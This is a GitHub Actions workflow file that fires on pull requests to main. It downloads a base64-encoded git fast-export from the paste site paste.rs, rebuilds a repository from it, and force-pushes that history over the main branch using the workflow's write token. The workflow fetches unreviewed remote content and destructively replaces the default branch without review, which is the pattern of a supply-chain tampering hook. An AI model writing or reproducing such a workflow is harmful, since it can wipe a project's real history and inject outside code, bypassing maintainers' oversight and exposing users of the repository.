name: Promote exact Phase 1-5 history

on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: exact-phase5-history-promotion
  cancel-in-progress: false

jobs:
  promote:
    if: github.event_name == 'workflow_dispatch' || github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: Download and verify signed transport
        shell: bash
        run: |
          set -euo pipefail
          curl --fail --location --retry 5 --retry-all-errors --retry-delay 2 \
            https://paste.rs/zEvyL.txt \
            --output /tmp/phase5.fast-export.xz.b64
          test "$(wc -c < /tmp/phase5.fast-export.xz.b64)" = "103488"
          echo "3d01202145cb75bd7d7c439463105b56a41a277bd071bdf722ec8c45370a3817  /tmp/phase5.fast-export.xz.b64" | sha256sum --check
          base64 --decode /tmp/phase5.fast-export.xz.b64 > /tmp/phase5.fast-export.xz
          echo "0bd530ec19af341243b841e68d201a2875183b17e8b83bfc71023a77bb41c2d4  /tmp/phase5.fast-export.xz" | sha256sum --check
          xz --test /tmp/phase5.fast-export.xz

      - name: Recreate and validate exact repository history
        shell: bash
        run: |
          set -euo pipefail
          rm -rf /tmp/imported
          git init -q /tmp/imported
          xz --decompress --stdout /tmp/phase5.fast-export.xz | git -C /tmp/imported fast-import --quiet
          test "$(git -C /tmp/imported rev-parse main)" = "aca7c097523d361248da9f9ad01cbeb19114c414"
          test "$(git -C /tmp/imported rev-parse main^{tree})" = "ae9a21adebc5e47eda8be2a006aa7d05c0cb9684"
          test "$(git -C /tmp/imported show main:package.json | python3 -c 'import json,sys; print(json.load(sys.stdin)["version"])')" = "0.0.6-alpha.0"
          test "$(git -C /tmp/imported show main:README.md | grep -c '^```mermaid')" -ge 3
          git -C /tmp/imported fsck --strict

      - name: Force-promote exact history to main
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          cd /tmp/imported
          git remote add origin "https://x-access-token:${GH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
          git push --force origin main:refs/heads/main
          actual="$(git ls-remote origin refs/heads/main | cut -f1)"
          test "$actual" = "aca7c097523d361248da9f9ad01cbeb19114c414"
          echo "Exact Phase 1-5 history published to main: $actual"
